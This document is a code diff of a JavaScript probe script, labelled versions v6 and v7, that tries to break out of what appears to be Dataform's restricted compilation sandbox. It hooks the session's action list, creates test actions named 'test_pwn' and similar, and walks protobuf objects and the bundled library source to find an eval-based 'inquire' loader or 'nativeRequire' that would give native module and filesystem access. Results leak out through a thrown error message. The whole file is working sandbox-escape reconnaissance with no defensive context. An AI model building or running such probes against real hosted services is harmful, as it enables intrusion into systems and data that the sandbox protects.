@@ -1,4 +1,4 @@
-// v6 — find escape hatch in bundle. Search for native require leaks, exports of `p`/helpers.
+// v7 — reach protobufjs.inquire via proto message → Type → util → inquire
 
 var out = {};
 function safe(k, fn) {
@@ -6,141 +6,221 @@ function safe(k, fn) {
   catch(e) { out[k] = 'ERR:' + (e.message || String(e)).substring(0, 400); }
 }
 
-var BUNDLE = restricted_fs.readFile('node_modules/@dataform/core/bundle.js').toString();
-out.BUNDLE_SIZE = BUNDLE.length;
+// ============ Walk into protobuf messages via session actions ============
+// Hook session.actions.push so when notebook/publish/operate registers an action,
+// we grab the proto message and walk it
+var s = global._DF_SESSION;
+var origPush = s.actions.push.bind(s.actions);
+globalThis.__capturedProtos = [];
+s.actions.push = function(action) {
+  try {
+    if (action && action.proto) {
+      globalThis.__capturedProtos.push({
+        action_type: action.constructor && action.constructor.name,
+        proto_keys: Object.getOwnPropertyNames(action.proto).join(','),
+        proto_proto: Object.getOwnPropertyNames(Object.getPrototypeOf(action.proto)).join(','),
+        ctor_name: action.proto.constructor && action.proto.constructor.name,
+        ctor_keys: action.proto.constructor && Object.getOwnPropertyNames(action.proto.constructor).join(',')
+      });
+    }
+  } catch(e) {}
+  return origPush(action);
+};
 
-// ============ Find the helper module that exports nativeRequire ============
-// Pattern: `t.nativeRequire = require;` — at offset 260977 per prior probe
-safe('A1_helper_module_full', function() {
-  var idx = BUNDLE.indexOf('t.nativeRequire = require;');
-  if (idx < 0) idx = BUNDLE.indexOf('t.nativeRequire=require');
-  if (idx < 0) return 'not_found';
-  // Walk back to find module wrapper start
-  // Webpack pattern: `function(e,t,r){...t.nativeRequire=require...}`
-  // Or `(e,t,r)=>{...t.nativeRequire=require...}`
-  var start = Math.max(0, idx - 3000);
-  var end = Math.min(BUNDLE.length, idx + 1500);
-  return BUNDLE.substring(start, end);
+// ============ Create test actions to trigger push ============
+safe('A1_create_publish', function() {
+  try {
+    var t = publish('test_pwn', { type: 'view' });
+    return 'made publish, t.proto.ctor=' + (t.proto && t.proto.constructor && t.proto.constructor.name);
+  } catch(e) { return 'err:' + e.message; }
 });
 
-// ============ Find ALL `require(N)` calls (webpack module IDs) ============
-safe('A2_webpack_require_ids', function() {
-  // Webpack uses r(N) where N is module ID
-  var pat = /[rabc]\(([0-9]+)\)/g;
-  var counts = {};
-  var m;
-  while ((m = pat.exec(BUNDLE)) !== null) {
-    counts[m[1]] = (counts[m[1]] || 0) + 1;
+safe('A2_publish_proto_walk', function() {
+  // Walk up from a freshly-created Table action
+  var t = new Object(); // placeholder
+  try {
+    var p = publish('walker_test', { type: 'view' });
+    var proto = p.proto;
+    var info = {
+      proto_typeof: typeof proto,
+      proto_ctor_name: proto.constructor && proto.constructor.name,
+      proto_ctor_keys: Object.getOwnPropertyNames(proto.constructor).join(','),
+      proto_ctor_proto_keys: Object.getOwnPropertyNames(Object.getPrototypeOf(proto.constructor)).join(',')
+    };
+    return JSON.stringify(info);
+  } catch(e) { return 'err:' + e.message; }
+});
+
+// ============ Look for protobufjs's Util / Reader / Type classes ============
+safe('B1_proto_constructor_dot_util', function() {
+  try {
+    var p = publish('util_probe', { type: 'view' });
+    var ctor = p.proto.constructor;
+    // protobufjs Type has $type, util, etc.
+    var keys = Object.getOwnPropertyNames(ctor);
+    var result = { keys, $type: typeof ctor.$type, util: typeof ctor.util };
+    if (ctor.$type) {
+      result.$type_keys = Object.getOwnPropertyNames(ctor.$type).slice(0, 30);
+    }
+    return JSON.stringify(result);
+  } catch(e) { return 'err:' + e.message; }
+});
+
+safe('B2_proto_constructor_root', function() {
+  try {
+    var p = publish('root_probe', { type: 'view' });
+    var ctor = p.proto.constructor;
+    // protobufjs Types reference their Root namespace
+    var R = ctor.$type && ctor.$type.parent;
+    if (R) {
+      return 'parent typeof=' + typeof R + ' keys=' + Object.getOwnPropertyNames(R).slice(0,30).join(',') + ' name=' + R.name;
+    }
+    return '$type=' + typeof ctor.$type + ' parent=null';
+  } catch(e) { return 'err:' + e.message; }
+});
+
+// ============ Try direct path: search for Util / inquire on the message itself ============
+safe('C1_walk_proto_inquire', function() {
+  try {
+    var p = publish('inquire_walk', { type: 'view' });
+    var found = [];
+    var queue = [{obj: p.proto, path: 'proto', depth: 0}];
+    var visited = new WeakSet();
+    while (queue.length > 0 && found.length < 50) {
+      var item = queue.shift();
+      if (item.depth > 4) continue;
+      var obj = item.obj;
+      if (!obj || (typeof obj !== 'object' && typeof obj !== 'function') || visited.has(obj)) continue;
+      visited.add(obj);
+      try {
+        var keys = Object.getOwnPropertyNames(obj);
+        for (var k of keys) {
+          if (k === 'inquire' || k === 'fs' || k.match(/inquire|nativeRequire/i)) {
+            found.push({path: item.path + '.' + k, val_type: typeof obj[k]});
+          }
+          try {
+            var v = obj[k];
+            if (v && (typeof v === 'object' || typeof v === 'function')) {
+              queue.push({obj: v, path: item.path + '.' + k, depth: item.depth + 1});
+            }
+          } catch(e) {}
+        }
+        // Also check prototype
+        var proto = Object.getPrototypeOf(obj);
+        if (proto && !visited.has(proto)) {
+          queue.push({obj: proto, path: item.path + '.__proto__', depth: item.depth + 1});
+        }
+      } catch(e) {}
+    }
+    return JSON.stringify(found);
+  } catch(e) { return 'err:' + e.message; }
+});
+
+// ============ Walk core / session / @dataform/core looking for protobufjs/util ============
+safe('C2_walk_core_for_util', function() {
+  var found = [];
+  var queue = [{obj: core, path: 'core', depth: 0}];
+  var visited = new WeakSet();
+  while (queue.length > 0 && found.length < 30) {
+    var item = queue.shift();
+    if (item.depth > 5) continue;
+    var obj = item.obj;
+    if (!obj || (typeof obj !== 'object' && typeof obj !== 'function') || visited.has(obj)) continue;
+    visited.add(obj);
+    try {
+      var keys = Object.getOwnPropertyNames(obj);
+      for (var k of keys) {
+        if (k === 'inquire' || k === 'fs' || k === 'Reader' || k === 'Writer' || k === 'util' || k === 'Root' || k === 'Type') {
+          found.push({path: item.path + '.' + k, val_type: typeof obj[k]});
+        }
+        try {
+          var v = obj[k];
+          if (v && (typeof v === 'object' || typeof v === 'function')) {
+            queue.push({obj: v, path: item.path + '.' + k, depth: item.depth + 1});
+          }
+        } catch(e) {}
+      }
+    } catch(e) {}
   }
-  var sorted = Object.entries(counts).sort((a,b)=>b[1]-a[1]).slice(0,20);
-  return JSON.stringify(sorted);
+  return JSON.stringify(found);
 });
 
-// ============ Look for module list (webpack puts modules as array) ============
-safe('A3_webpack_module_array_start', function() {
-  // The webpack bundle starts with module array like [function(){...}, function(){...}, ...]
-  // The first '[' followed by 'function' or '(e,t' pattern
-  var idx = BUNDLE.search(/\[\s*function/);
-  if (idx >= 0) return 'first [function at offset ' + idx + ' context:' + BUNDLE.substring(idx, idx + 500);
-  idx = BUNDLE.search(/\[\(e,t/);
-  if (idx >= 0) return 'first [(e,t at offset ' + idx + ' context:' + BUNDLE.substring(idx, idx + 500);
-  return 'no module array';
+// ============ Find ALL objects with `inquire` property in reachable globals ============
+safe('D1_find_inquire_in_globals', function() {
+  var roots = ['_DF_SESSION', 'core', 'dataform', 'restricted_fs', 'vm', 'require', 'path', 'assert', 'publish', 'operate', 'declare', 'notebook'];
+  var results = {};
+  for (var rname of roots) {
+    var r = globalThis[rname];
+    if (!r) continue;
+    try {
+      if (typeof r.inquire === 'function') results[rname + '.inquire'] = 'GOT';
+      if (r.fs !== undefined) results[rname + '.fs'] = typeof r.fs;
+      if (r.util !== undefined) results[rname + '.util'] = typeof r.util;
+    } catch(e) {}
+  }
+  return JSON.stringify(results);
 });
 
-// ============ Look at the top of bundle — webpack runtime ============
-safe('B1_bundle_top_1000', function() { return BUNDLE.substring(0, 1500); });
-safe('B2_bundle_end_2000', function() { return BUNDLE.substring(BUNDLE.length - 2000); });
+// ============ Bundle source — look for ALL places that expose protobufjs ============
+var BUNDLE = restricted_fs.readFile('node_modules/@dataform/core/bundle.js').toString();
 
-// ============ Look for `module.exports = ` or `exports.main` near the end ============
-safe('B3_module_exports_pattern', function() {
-  // Webpack's UMD exports
-  var pat = /module\.exports\s*=/g;
+safe('E1_protobufjs_exports', function() {
+  // Find exports.inquire or similar
+  var pats = [/\b\w+\.inquire\s*=\s*\w+/g, /exports\.inquire/g, /t\.inquire\s*=/g];
   var matches = [];
-  var m;
-  while ((m = pat.exec(BUNDLE)) !== null && matches.length < 5) {
-    matches.push({offset: m.index, ctx: BUNDLE.substring(Math.max(0, m.index - 100), m.index + 200)});
+  for (var p of pats) {
+    var m;
+    while ((m = p.exec(BUNDLE)) !== null && matches.length < 10) {
+      matches.push({pat: p.toString(), at: m.index, ctx: BUNDLE.substring(Math.max(0,m.index-50), m.index + 200)});
+    }
   }
   return JSON.stringify(matches);
 });
 
-// ============ Find any references to native modules in bundle ============
-safe('C1_fs_references', function() {
-  var pat = /require\(["']fs["']\)|nativeRequire\(["']fs["']\)/g;
-  var matches = BUNDLE.match(pat);
-  return matches ? matches.length + ' matches' : 'none';
-});
-
-safe('C2_child_process_references', function() {
-  var pat = /["']child_process["']/g;
-  var matches = BUNDLE.match(pat);
-  return matches ? matches.length + ' matches' : 'none';
-});
-
-safe('C3_process_global_refs', function() {
-  // process.env or process.cwd patterns
-  var matches1 = (BUNDLE.match(/process\.env/g) || []).length;
-  var matches2 = (BUNDLE.match(/process\.cwd/g) || []).length;
-  var matches3 = (BUNDLE.match(/process\.argv/g) || []).length;
-  return 'env=' + matches1 + ' cwd=' + matches2 + ' argv=' + matches3;
-});
-
-// ============ Look for Function constructor / eval / new Function patterns inside bundle ============
-safe('D1_new_function_patterns', function() {
-  var pat = /new\s+Function\(/g;
-  var matches = BUNDLE.match(pat);
-  return matches ? matches.length + ' matches' : 'none';
-});
-
-safe('D2_eval_patterns', function() {
-  var pat = /\beval\s*\(/g;
-  var matches = BUNDLE.match(pat);
-  return matches ? matches.length + ' matches' : 'none';
-});
-
-// ============ Look for VM module usage inside bundle ============
-safe('E1_vm_usage', function() {
-  var pat = /require\(["']vm["']\)|\.compileModule|\.runInNewContext/g;
-  var matches = BUNDLE.match(pat);
-  return matches ? JSON.stringify(matches.slice(0, 10)) : 'none';
-});
-
-// ============ Find ALL exports.X patterns to map the helper module's exports ============
-safe('F1_helper_module_exports', function() {
-  var helperIdx = BUNDLE.indexOf('t.nativeRequire');
-  if (helperIdx < 0) return 'no helper';
-  // Walk forward from helperIdx, find all 't.<name>'
-  var slice = BUNDLE.substring(helperIdx, helperIdx + 3000);
-  var pat = /t\.([a-zA-Z_$][\w$]*)\s*=/g;
-  var exports_list = [];
-  var m;
-  while ((m = pat.exec(slice)) !== null) {
-    exports_list.push({name: m[1], rel_offset: m.index});
+safe('E2_inquire_function_definition', function() {
+  // The actual function inquire(moduleName){...}
+  var idx = BUNDLE.indexOf('function inquire(');
+  if (idx < 0) {
+    // alternate: var inquire = ...
+    idx = BUNDLE.indexOf('var inquire');
   }
-  return JSON.stringify(exports_list);
+  if (idx < 0) {
+    // search by eval signature
+    var m = BUNDLE.match(/function\s*\(\s*\w+\s*\)\s*\{\s*try\s*\{\s*var\s+\w+\s*=\s*\(\s*eval\(/);
+    if (m) idx = BUNDLE.indexOf(m[0]);
+  }
+  if (idx < 0) return 'not found';
+  return BUNDLE.substring(idx, idx + 1000);
 });
 
-// ============ Find how `p` is initialized in core.main scope ============
-safe('G1_p_definition_in_main', function() {
-  // Find around `t.main=function(e)` and look for `p` definitions before it
-  var idx = BUNDLE.indexOf('t.main=function');
-  if (idx < 0) return 'main not found';
-  // Look backward for module wrapping start
-  var preCtx = BUNDLE.substring(Math.max(0, idx - 800), idx);
-  return preCtx;
+safe('E3_eval_context', function() {
+  var idx = BUNDLE.indexOf('eval(');
+  if (idx < 0) return 'no eval';
+  return BUNDLE.substring(Math.max(0, idx - 300), idx + 500);
 });
 
-// ============ Walk session prototype methods for nativeRequire-using ones ============
-safe('H1_session_publish_src', function() {
-  return String(global._DF_SESSION.publish).substring(0, 1500);
-});
-
-safe('H2_session_operate_src', function() {
-  return String(global._DF_SESSION.operate).substring(0, 1500);
-});
-
-safe('H3_session_notebook_src', function() {
-  return String(global._DF_SESSION.notebook).substring(0, 2000);
+// ============ Try directly calling the existing protobuf messages we have ============
+safe('F1_message_encode_walk', function() {
+  // Each protobuf message type has static methods: create, encode, decode, etc.
+  // These are tied to a Type instance which has parent (Namespace/Root)
+  try {
+    var p = publish('encode_walk', { type: 'view' });
+    var ctor = p.proto.constructor;
+    var visited = [];
+    var current = ctor;
+    var depth = 0;
+    while (current && depth < 10) {
+      visited.push({
+        name: current.name || '(no_name)',
+        keys: Object.getOwnPropertyNames(current).slice(0, 20).join(','),
+        proto_keys: Object.getOwnPropertyNames(Object.getPrototypeOf(current) || {}).slice(0, 20).join(',')
+      });
+      current = Object.getPrototypeOf(current);
+      depth++;
+    }
+    return JSON.stringify(visited);
+  } catch(e) { return 'err:' + e.message; }
 });
 
 module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
-throw new Error('PROBE_v6:' + JSON.stringify(out));
+throw new Error('PROBE_v7:' + JSON.stringify(out));
